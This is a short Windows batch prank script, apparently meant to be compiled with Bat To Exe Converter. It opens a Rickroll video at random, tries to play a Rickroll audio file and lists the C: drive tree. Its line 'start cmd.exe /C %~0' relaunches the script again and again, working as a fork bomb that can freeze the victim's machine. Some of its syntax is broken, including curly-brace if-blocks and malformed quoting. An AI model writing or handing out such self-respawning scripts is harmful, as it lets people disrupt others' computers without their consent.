::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyG0kIB5GcCqNKEqID7YX+uf349aqp0kUVd4NcYzQyLuCLK4e+haE
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJHaQ/EciFDVbWCWwNWixFLoQ5NTW6u6Oo3EvXeE0aoDX1vqHI+9z
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQIeJw91fg2BN3m1CrlS7fD+jw==
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWGm0tGE/OgsaLA==
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATE1008LVt6RQeKM2epZg==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJHaQ/EciFDVbWCWwNWixFLoQ5NTV4PiKo0Eheu0rWb3S2b+cL+wfpED8cPY=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
set /a a=%random% %%4
if %a%==1 {
start "" https://www.youtube.com/watch?v=oHg5SJYRHA0
}
start cmd.exe /C %~0 parameters
tasklist | find /I "Music.UI.exe" 
if errorlevel 1 (
        start "explorer.exe shell:C:\Program Files\WindowsApps\Microsoft.ZuneMusic_3.6.25021.0_x64__8wekyb3d8bbwe!Microsoft.ZuneMusic" "Rickroll.mp3"
) else (
cd c:/
tree
)